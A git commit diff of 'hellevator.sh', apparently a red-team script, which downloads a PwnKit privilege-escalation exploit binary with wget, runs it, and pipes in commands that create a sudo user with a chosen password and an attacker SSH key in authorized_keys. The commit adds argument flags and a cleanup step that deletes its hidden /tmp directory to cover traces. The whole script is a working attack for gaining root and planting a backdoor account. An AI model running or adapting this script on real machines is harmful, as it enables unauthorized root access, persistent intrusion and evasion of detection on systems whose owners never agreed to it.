e3c96ca490fd4e4b200afd0992112e51012efd3f
Josh Correia <joshmcorreia@gmail.com>
2023-05-04 01:03:22 -0700

    Update hellevator to clean up after itself and accept arguments

--- hellevator.sh
+++ hellevator.sh
@@ -1,11 +1,23 @@
+# read flags
+while getopts u:p:s: flag
+do
+    case "${flag}" in
+        u) SSH_USERNAME=${OPTARG};;
+        p) SSH_PASSWORD=${OPTARG};;
+        s) SSH_KEY=${OPTARG};;
+    esac
+done
+
 echo "Running Hellevator!"
 
-SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHEVlp/30J0wOuK53YrqMTQ7SduqUw3Mj6R1vfFx76zm josh@parrot"
-ADD_USER="useradd -m josh -g sudo -s /bin/bash; echo 'josh:password' | chpasswd; mkdir -p /home/josh/.ssh && touch /home/josh/.ssh/authorized_keys; echo '$SSH_KEY' > /home/josh/.ssh/authorized_keys; cat /home/josh/.ssh/authorized_keys"
+ADD_USER_COMMAND="useradd -m $SSH_USERNAME -g sudo -s /bin/bash; echo '$SSH_USERNAME:$SSH_PASSWORD' | chpasswd; mkdir -p /home/$SSH_USERNAME/.ssh && touch /home/$SSH_USERNAME/.ssh/authorized_keys; echo '$SSH_KEY' > /home/$SSH_USERNAME/.ssh/authorized_keys; cat /home/$SSH_USERNAME/.ssh/authorized_keys"
 
 echo "Exploiting PwnKit..."
 mkdir -p /tmp/.lolzpwnd/$USER
 cd /tmp/.lolzpwnd/$USER
 wget -O pwnkit_x64 https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/exploits/pwnkit_x64
 chmod +x pwnkit_x64
-echo $ADD_USER | ./pwnkit_x64
+echo $ADD_USER_COMMAND | ./pwnkit_x64
+
+# clean up after ourselves
+rm -rf /tmp/.lolzpwnd/$USER
